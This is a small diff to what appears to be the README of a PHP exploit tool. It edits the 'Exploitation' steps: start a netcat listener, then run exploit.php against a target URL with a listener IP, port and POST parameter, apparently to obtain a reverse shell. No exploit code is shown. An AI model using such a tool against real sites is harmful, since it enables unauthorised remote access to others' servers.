@@ -44,7 +44,7 @@ You can test it by running the curl commented in the code fragment above and you
 
 ## Exploitation
 * Set up a netcat listener(e.g. nc -vlp 8888)
-* Run exploit.php either with exec permissions or via php php with the following command line:
+* Run exploit.php with the following command line:
 ```bash
 ./exploit.php http://url.to.attack netcat-ip-address  netcat-port post-parameter-to-attack 
 ```
